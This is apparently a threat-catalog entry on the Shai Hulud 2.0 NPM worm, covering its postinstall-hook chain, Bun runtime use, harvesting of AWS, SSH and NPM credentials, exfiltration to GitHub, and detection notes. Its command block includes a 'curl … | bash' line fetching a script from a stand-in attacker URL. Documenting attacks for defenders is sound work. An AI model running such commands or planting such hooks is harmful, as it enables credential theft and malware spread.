title: Shai Hulud 2.0: NPM Supply Chain Worm
description: A sophisticated supply chain attack targeting NPM users. It leverages the Bun runtime for stealthy execution, harvests cloud credentials, exfiltrates data to GitHub, and attempts self-propagation by publishing malicious packages using stolen tokens.
shortDescription: NPM worm utilizing Bun runtime and GitHub

metadata.descriptionHtml:
Shai Hulud 2.0 is an advanced NPM supply chain attack that functions as a worm. It distinguishes itself by installing and using the Bun runtime to execute malicious JavaScript, likely to evade detections tuned for Node.js.

  1. Attacker publishes a malicious package to the NPM registry.
  2. When a victim runs npm install, a postinstall hook triggers.
  3. The script detects or installs the Bun runtime.
  4. It executes the payload using Bun, harvesting sensitive files (AWS keys, SSH keys, NPM tokens).
  5. Data is exfiltrated to an attacker-controlled GitHub repository (using it as C2/Dead Drop).
  6. The malware uses stolen NPM tokens to publish further malicious packages, propagating the worm.
metadata.commandsBlock:
# Step 1: Attacker publishes the initial carrier package
$ npm publish @malicious/shai-hulud

# Step 2: Victim executes installation
$ npm install @malicious/shai-hulud

# Step 3: Malicious postinstall hook triggers (simplified)
$ curl -sL http://attacker-url/setup.sh | bash

# Step 4: Malware uses Bun to run payload
$ ~/.bun/bin/bun run payload.js

# Step 5: Exfiltration to GitHub
$ git push origin main
extraInfo: NPM Registry - Attack leverages official npm publishing flow
GitHub Dead Drop - Exfiltration via git push to attacker repo
Bun Runtime - https://bun.sh - Used to evade Node.js detections
MITRE T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain
prerequisites: Victim must install the compromised/typosquatted package
Outbound network access to GitHub and NPM
Write access to victim's file system (standard for npm install)
detectionNotes: Unusual outbound traffic to random GitHub repositories during npm install
Modification of package.json scripts in unrelated projects
Process execution tree showing 'bun' spawned from 'npm'
